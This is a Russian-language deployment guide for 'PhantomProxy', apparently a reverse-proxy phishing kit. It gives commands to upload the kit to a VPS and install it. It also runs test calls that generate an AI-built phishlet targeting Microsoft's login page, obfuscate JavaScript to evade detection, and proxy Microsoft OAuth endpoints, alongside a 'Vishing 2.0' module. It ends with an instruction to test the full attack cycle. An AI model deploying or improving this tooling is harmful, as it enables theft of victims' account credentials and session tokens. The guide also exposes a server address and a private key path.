# 🚀 PHANTOMPROXY v1.7.0 - ПОЛНАЯ ПЕРЕУСТАНОВКА НА VPS

**Версия:** 1.7.0  
**Время установки:** 15-20 минут

---

## 📋 ЧАСТЬ 1: ПОДГОТОВКА (5 минут)

### Шаг 1.1: Загрузка всех файлов на сервер

**Выполнить на локальной машине:**

```bash
cd "C:\Users\Administrator\IdeaProjects\Evingix TOP PROdachen"

# 1. Загрузка Go модулей
scp -i "C:\Users\Administrator\.ssh\vk-cloud.pem" go.mod go.sum phantom-proxy.exe ubuntu@212.233.93.147:~/phantom-proxy/

# 2. Загрузка cmd
scp -i "C:\Users\Administrator\.ssh\vk-cloud.pem" -r cmd ubuntu@212.233.93.147:~/phantom-proxy/

# 3. Загрузка internal
scp -i "C:\Users\Administrator\.ssh\vk-cloud.pem" -r internal ubuntu@212.233.93.147:~/phantom-proxy/

# 4. Загрузка configs
scp -i "C:\Users\Administrator\.ssh\vk-cloud.pem" -r configs ubuntu@212.233.93.147:~/phantom-proxy/

# 5. Загрузка конфигов
scp -i "C:\Users\Administrator\.ssh\vk-cloud.pem" config.yaml phantom-proxy.exe ubuntu@212.233.93.147:~/phantom-proxy/

# 6. Загрузка скриптов
scp -i "C:\Users\Administrator\.ssh\vk-cloud.pem" INSTALL.sh run_tests.sh ubuntu@212.233.93.147:~/phantom-proxy/
```

**Или одной командой (если есть rsync):**
```bash
rsync -avz -e "ssh -i C:\Users\Administrator\.ssh\vk-cloud.pem" \
  --exclude='.git' \
  --exclude='*.md' \
  . ubuntu@212.233.93.147:~/phantom-proxy/
```

---

## 📋 ЧАСТЬ 2: УСТАНОВКА НА СЕРВЕРЕ (10 минут)

### Шаг 2.1: Подключение к серверу

```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147
```

### Шаг 2.2: Запуск установки

```bash
cd ~/phantom-proxy
chmod +x INSTALL.sh
bash INSTALL.sh
```

**Ожидаемый вывод:**
```
============================================================
PHANTOMPROXY v1.7.0 - ПОЛНАЯ УСТАНОВКА
============================================================

[1/8] Очистка старой версии...
✅ Очистка завершена

[2/8] Создание структуры директорий...
✅ Структура создана

[3/8] Проверка файлов...
✅ Go модули найдены

[4/8] Установка Go зависимостей...
✅ Go сборка завершена

[5/8] Установка Python зависимостей...
✅ Python зависимости установлены

[6/8] Запуск сервисов...
🚀 PhantomProxy запущен
🚀 AI Orchestrator запущен
🚀 GAN Obfuscation запущен
🚀 ML Optimization запущен
🚀 Vishing 2.0 запущен

[7/8] Ожидание запуска сервисов...
✅ Сервисы запущены

[8/8] Проверка сервисов...
✅ Main API (порт 8080) - РАБОТАЕТ
✅ AI Orchestrator (порт 8081) - РАБОТАЕТ
✅ GAN Obfuscation (порт 8084) - РАБОТАЕТ
✅ ML Optimization (порт 8083) - РАБОТАЕТ
✅ Vishing 2.0 (порт 8082) - РАБОТАЕТ
✅ HTTPS Proxy (порт 8443) - РАБОТАЕТ

============================================================
РЕЗУЛЬТАТЫ УСТАНОВКИ
============================================================
Сервисов работает: 6 из 6

✅ УСТАНОВКА ЗАВЕРШЕНА УСПЕШНО!
============================================================
```

---

## 📋 ЧАСТЬ 3: ПРОВЕРКА (5 минут)

### Шаг 3.1: Быстрая проверка

```bash
# Проверка всех сервисов
curl http://localhost:8080/health && echo " ✅ Main API"
curl http://localhost:8081/health && echo " ✅ AI Orchestrator"
curl http://localhost:8084/health && echo " ✅ GAN Obfuscation"
curl http://localhost:8083/health && echo " ✅ ML Optimization"
curl http://localhost:8082/health && echo " ✅ Vishing 2.0"
curl -k https://localhost:8443/health && echo " ✅ HTTPS Proxy"
```

### Шаг 3.2: Запуск автоматических тестов

```bash
cd ~/phantom-proxy
chmod +x run_tests.sh
bash run_tests.sh
```

**Ожидаемый результат:**
```
Total Tests:  15
Passed:       15
Failed:       0
Pass Rate:    100%
ALL TESTS PASSED!
```

---

## 📋 ЧАСТЬ 4: РУЧНОЕ ТЕСТИРОВАНИЕ

### Тест 4.1: AI Генерация Фишлета

```bash
curl -X POST http://localhost:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{"target_url":"https://login.microsoftonline.com"}'
```

**Ожидаемый результат:**
```json
{
  "success": true,
  "phishlet_yaml": "author: '@ai-orchestrator'..."
}
```

### Тест 4.2: GAN Обфускация

```bash
curl -X POST http://localhost:8084/api/v1/gan/obfuscate \
  -H "Content-Type: application/json" \
  -d '{"code":"var x = 1;","level":"high","session_id":"test"}'
```

**Ожидаемый результат:**
```json
{
  "success": true,
  "obfuscated_code": "var _0x5a2b = ...",
  "mutations_applied": ["variable_rename", "..."]
}
```

### Тест 4.3: ML Обучение

```bash
curl -X POST http://localhost:8083/api/v1/ml/train \
  -H "Content-Type: application/json" \
  -d '{"min_samples":10}'
```

### Тест 4.4: API Статистика

```bash
curl http://localhost:8080/api/v1/stats
```

### Тест 4.5: HTTPS Прокси

```bash
curl -k https://localhost:8443/common/oauth2/v2.0/authorize
```

---

## 🐛 ВОЗМОЖНЫЕ ПРОБЛЕМЫ И РЕШЕНИЯ

### Проблема 1: "bash: go: command not found"

**Решение:**
```bash
# Установка Go
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
```

### Проблема 2: "pip3: command not found"

**Решение:**
```bash
sudo apt update
sudo apt install -y python3-pip
```

### Проблема 3: "port already in use"

**Решение:**
```bash
# Найти процесс
sudo lsof -i :8080

# Убить процесс
sudo kill -9 <PID>
```

### Проблема 4: Сервис не запускается

**Решение:**
```bash
# Проверка логов
tail -f ~/phantom-proxy/phantom.log
tail -f ~/phantom-proxy/internal/ai/ai.log
tail -f ~/phantom-proxy/internal/ganobf/gan.log
tail -f ~/phantom-proxy/internal/mlopt/ml.log
tail -f ~/phantom-proxy/internal/vishing/vishing.log

# Проверка что процесс запущен
ps aux | grep python3
ps aux | grep phantom
```

---

## ✅ ЧЕК-ЛИСТ УСПЕШНОЙ УСТАНОВКИ

- [ ] Все файлы загружены на сервер
- [ ] Go установлен (проверить: `go version`)
- [ ] Python3 установлен (проверить: `python3 --version`)
- [ ] pip3 установлен (проверить: `pip3 --version`)
- [ ] Скрипт INSTALL.sh выполнен без ошибок
- [ ] Все 6 сервисов работают (проверить curl)
- [ ] Автоматические тесты пройдены (15/15)
- [ ] Ручные тесты работают

---

## 📊 ОЖИДАЕМЫЕ РЕЗУЛЬТАТЫ

**После успешной установки:**

| Сервис | Порт | Статус |
|--------|------|--------|
| Main API | 8080 | ✅ |
| AI Orchestrator | 8081 | ✅ |
| Vishing 2.0 | 8082 | ✅ |
| ML Optimization | 8083 | ✅ |
| GAN Obfuscation | 8084 | ✅ |
| HTTPS Proxy | 8443 | ✅ |

**Pass Rate тестов:** 100% (15/15)

---

## 📝 СЛЕДУЮЩИЕ ШАГИ

После успешной установки:

1. **Заполни тест-отчёт** (TESTING_GUIDE_MANUAL.md)
2. **Проверь каждый модуль** вручную
3. **Протестируй полный цикл** атаки
4. **Отправь отчёт**

---

**УДАЧНОЙ УСТАНОВКИ!** 🚀
